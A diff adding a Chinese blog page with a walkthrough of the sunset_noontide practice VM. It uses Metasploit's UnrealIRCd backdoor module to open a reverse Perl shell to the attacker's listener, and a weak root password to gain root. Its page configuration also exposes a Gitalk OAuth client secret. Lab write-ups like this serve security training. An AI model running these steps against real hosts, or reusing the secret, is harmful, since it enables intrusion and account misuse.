@@ -1,0 +1,683 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="sunset_noontide信息收集1234567891011┌──(kali㉿kali)-[~&#x2F;Documents&#x2F;sunset_noontide]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.150Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-10-09 05:25 EDTNmap scan re">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sunset_noontide 靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/10/125a16ce3195.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="sunset_noontide信息收集1234567891011┌──(kali㉿kali)-[~&#x2F;Documents&#x2F;sunset_noontide]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.150Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-10-09 05:25 EDTNmap scan re">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/40213028a320339d58cc4ae6d0aa91b0_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/62fca7764f5809837714c73f7a907ea5_MD5.png">
+<meta property="article:published_time" content="2023-10-09T13:09:02.000Z">
+<meta property="article:modified_time" content="2023-10-09T15:20:01.970Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/40213028a320339d58cc4ae6d0aa91b0_MD5.png">
+  
+  
+  
+  <title>sunset_noontide 靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="sunset_noontide 靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-09 21:09" pubdate>
+          2023年10月9日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          47 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">sunset_noontide 靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="sunset-noontide"><a href="#sunset-noontide" class="headerlink" title="sunset_noontide"></a>sunset_noontide</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_noontide]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.150<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 05:25 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.150<br>Host is up (0.00034s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>6667/tcp open  irc<br>6697/tcp open  ircs-u<br>8067/tcp open  infi-async<br>MAC Address: 08:00:27:91:A9:5B (Oracle VirtualBox virtual NIC)<br></code></pre></td></tr></table></figure>
+
+<p>开了三个不太熟悉的端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_noontide]<br>└─$ sudo nmap -sT -sV -sC -O -p6667,6697,8067 192.168.56.150<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 05:26 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.150<br>Host is up (0.00083s latency).<br><br>PORT     STATE SERVICE VERSION<br>6667/tcp open  irc     UnrealIRCd<br>6697/tcp open  irc     UnrealIRCd<br>8067/tcp open  irc     UnrealIRCd<br>MAC Address: 08:00:27:91:A9:5B (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Aggressive OS guesses: Linux 3.5 (97%), Linux 3.1 (95%), Linux 3.2 (95%), Check Point VPN-1 UTM appliance (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Netgear GS700T- or XS700T-series switch (94%), Linux 2.6.32 (93%), Linux 3.2 - 4.9 (93%), Linux 4.15 - 5.8 (93%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (93%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 1 hop<br>Service Info: Host: irc.foonet.com<br></code></pre></td></tr></table></figure>
+
+<p>irc 服务不太了解，不过还是把流程走完吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_noontide]<br>└─$ sudo nmap --script=vuln -p6667,6697,8067 192.168.56.150 <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 05:27 EDT<br>Pre-scan script results:<br>| broadcast-avahi-dos: <br>|   Discovered hosts:<br>|     224.0.0.251<br>|   After NULL UDP avahi packet DoS (CVE-2011-1002).<br>|_  Hosts are all up (not vulnerable).<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.150<br>Host is up (0.00033s latency).<br><br>PORT     STATE SERVICE<br>6667/tcp open  irc<br>6697/tcp open  ircs-u<br>| irc-botnet-channels: <br>|_  ERROR: Closing Link: [192.168.56.106] (Too many unknown connections from your IP)<br>|_ssl-ccs-injection: No reply from server (TIMEOUT)<br>8067/tcp open  infi-async<br>| irc-botnet-channels: <br>|_  ERROR: Closing Link: [192.168.56.106] (Too many unknown connections from your IP)<br>MAC Address: 08:00:27:91:A9:5B (Oracle VirtualBox virtual NIC)<br></code></pre></td></tr></table></figure>
+
+<h2 id="IRC-渗透"><a href="#IRC-渗透" class="headerlink" title="IRC 渗透"></a>IRC 渗透</h2><p>那就只能从 irc 着手了，查到了一些相关资料</p>
+<p><img src="/pic/40213028a320339d58cc4ae6d0aa91b0_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Yehnn/kali/blob/master/kali%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%BB%E5%87%BB/11%E6%94%BB%E5%87%BB%20Unreal%20Ircd%20%E6%9C%8D%E5%8A%A1.md">kali&#x2F;kali服务器攻击&#x2F;11攻击 Unreal Ircd 服务.md at master · Yehnn&#x2F;kali (github.com)</a></p>
+<p>大部分都是直接使用 msf 的</p>
+<p><img src="/pic/62fca7764f5809837714c73f7a907ea5_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>不使用 msf 的话，exp 中的 pl 脚本直接运行有问题。还是用 msf 吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; <span class="hljs-built_in">set</span> RHOSTS 192.168.56.150<br>RHOSTS =&gt; 192.168.56.150<br>msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; <span class="hljs-built_in">set</span> RPORT 6697<br>RPORT =&gt; 6697<br>msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; run<br><br>[-] 192.168.56.150:6697 - Exploit failed: A payload has not been selected.<br>[*] Exploit completed, but no session was created.<br></code></pre></td></tr></table></figure>
+
+<p>可以使用 <code>show payloads</code> 查看可用的 paylaod，我按照刚才链接的那篇文章中的方法，设置 payload 为 <code>cmd/unix/reverse_perl</code> ，并设置了LHOST</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; <span class="hljs-built_in">set</span> payload cmd/unix/reverse_perl<br>payload =&gt; cmd/unix/reverse_perl<br>msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; <span class="hljs-built_in">set</span> LHOST 192.168.56.106<br>LHOST =&gt; 192.168.56.106<br>msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.56.106:4444 <br>[*] 192.168.56.150:6667 - Connected to 192.168.56.150:6667...<br>    :irc.foonet.com NOTICE AUTH :*** Looking up your hostname...<br>    :irc.foonet.com NOTICE AUTH :*** Couldn\<span class="hljs-string">&#x27;t resolve your hostname; using your IP address instead</span><br><span class="hljs-string">[*] 192.168.56.150:6667 - Sending backdoor command...</span><br><span class="hljs-string">   </span><br><span class="hljs-string">[*] Command shell session 1 opened (192.168.56.106:4444 -&gt; 192.168.56.150:51882) at 2023-10-09 07:31:46 -0400</span><br><span class="hljs-string"></span><br><span class="hljs-string">whoami</span><br><span class="hljs-string">server</span><br><span class="hljs-string">id</span><br><span class="hljs-string">uid=1000(server) gid=1000(server) groups=1000(server),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)</span><br><span class="hljs-string">uname -a</span><br><span class="hljs-string">Linux noontide 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux</span><br><span class="hljs-string">ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="hljs-string">    link/ether 08:00:27:91:a9:5b brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.168.56.150/24 brd 192.168.56.255 scope global dynamic enp0s3</span><br><span class="hljs-string">       valid_lft 595sec preferred_lft 595sec</span><br><span class="hljs-string">    inet6 fe80::a00:27ff:fe91:a95b/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">which python2</span><br><span class="hljs-string">which python3</span><br><span class="hljs-string">/usr/bin/python3</span><br><span class="hljs-string">python3 -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">server@noontide:~/irc/Unreal3.2$</span><br><span class="hljs-string">server@noontide:~/irc$ cd ..</span><br><span class="hljs-string">cd ..</span><br><span class="hljs-string">server@noontide:~$ ls</span><br><span class="hljs-string">ls</span><br><span class="hljs-string">irc  local.txt</span><br><span class="hljs-string">server@noontide:~$ cat local.txt</span><br><span class="hljs-string">cat local.txt</span><br><span class="hljs-string">c53c08b5bf2b0801c5d0c24149826a6e</span><br></code></pre></td></tr></table></figure>
+
+<p>提权部分卡了好大一会，尝试了敏感文件、定时文件、SUID 文件、shadow 文件权限、Linpeas 收集信息</p>
+<h2 id="弱密码提权"><a href="#弱密码提权" class="headerlink" title="弱密码提权"></a>弱密码提权</h2><p>没想到，竟然直接 root 弱密码，没绷住</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">server@noontide:~/irc/Unreal3.2$ su<br>su<br>Password: root<br><br>root@noontide:/home/server/irc/Unreal3.2<span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br>root@noontide:~<span class="hljs-comment"># ls </span><br><span class="hljs-built_in">ls</span><br>proof.txt<br>root@noontide:~<span class="hljs-comment"># cat proof.txt</span><br><span class="hljs-built_in">cat</span> proof.txt<br>ab28c8ca8da1b9ffc2d702ac54221105<br><br>Thanks <span class="hljs-keyword">for</span> playing! - Felipe Winsnes (@whitecr0wz)<br>root@noontide:~<span class="hljs-comment"># ip a</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:91:a9:5b brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.150/24 brd 192.168.56.255 scope global dynamic enp0s3<br>       valid_lft 595sec preferred_lft 595sec<br>    inet6 fe80::a00:27ff:fe91:a95b/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>root@noontide:~<span class="hljs-comment"># uname -a</span><br><span class="hljs-built_in">uname</span> -a<br>Linux noontide 4.19.0-10-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux</span><br>root@noontide:~<span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>sunset_noontide 靶机</div>
+      <div>https://i3eg1nner.github.io/2023/10/125a16ce3195.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年10月9日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/4a11524f2c39.html" title="dawn3 靶机">
+                        <span class="hidden-mobile">dawn3 靶机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: 'b6de6cb38992d748a0431f2a3175cb47'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
